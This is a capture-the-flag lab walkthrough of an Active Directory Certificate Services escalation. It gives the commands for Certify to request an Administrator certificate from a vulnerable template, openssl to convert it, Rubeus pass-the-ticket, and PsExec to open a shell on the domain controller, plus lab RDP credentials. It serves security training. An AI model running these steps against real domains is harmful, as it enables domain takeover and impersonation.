---
date: 2025-03-29
categories: [CTF, ImmersiveLabs]
title: "IML - Kerberos: Ep.12 – Active Directory Certificate Services"
tags: ['kerberos', 'powershell', 'privilege escalation', 'rce', 'windows']

description: "Kerberos Ep.12 – Active Directory Certificate Services - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Kerberos: Ep.12 – Active Directory Certificate Services


![image1](../resources/7d7a429777be4cf19f3ba70208d789a8.png)

# ![image2](../resources/c4da4ac2027b4e3a91982717374c9066.png)

- RDP:

```bash
xfreerdp /v:10.102.155.250 /u:s.villanelle /p:Summ3r2021! /d:krbtown +clipboard +drives /drive:root,/home/kali /dynamic-resolution

```

![image3](../resources/a9a5876ac10240f8aad2da637531d87b.png)

- Find vulnerable templates:

```bash
.\Certify.exe find /vulnerable

```

![image4](../resources/4d5053b71ba6429599937c68df085f50.png)


![image5](../resources/1c64d1f5b87b4b968899a696cd2d43c7.png)

Certify request /ca:\<Name of the CA retrieved previously\> /template:\<Name of the vulnerable template\> /altname:\<User to impersonate\>

```bash
.\Certify.exe request /ca:DC01.krbtown.local\krbtown-DC01-CA /template:VulnTemplate /altname:Administrator

```

![image6](../resources/ad0e7c5968c24307849204d267c2bfb7.png)


![image7](../resources/e2efa4d4c0a54ff6840669157a13476a.png)


![image8](../resources/d86ff838cf6a4702bfe5e7ee7efaf3a5.png)

- Copy RSA key and Cert and paste in to Kali (cert.pem):

- Run (Leave passwords blank):

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

```

![image9](../resources/8e7f664fc6dc4c7fbf64c38c6cb1ef51.png)


![image10](../resources/85bc0f8d3de64b9d8cfab52f5f1134b0.png)


![image11](../resources/85dc7fd2b2ee45a2b23c26ff1d216147.png)

- Copy that file through the mounted drive to the Windows Desktop

- Open Powershell:

```bash
.\Rubeus.exe asktgt /certificate:cert.pfx /user:Administrator /ptt

```

![image12](../resources/266bfb7099854794b544397155b6ea0d.png)


![image13](../resources/10154dc0477d4a01b64822ffb0026a7f.png)

- Now that you have a TGT for the administrator user, you can use PsExec to log in to the DC:

```bash
.\PsExec64.exe \\dc01.krbtown.local cmd

```

![image14](../resources/381d5bb04ab04527a744dbb196399635.png)


![image15](../resources/4d997eadf3e646d898b9bcc6d7ae6cf2.png)
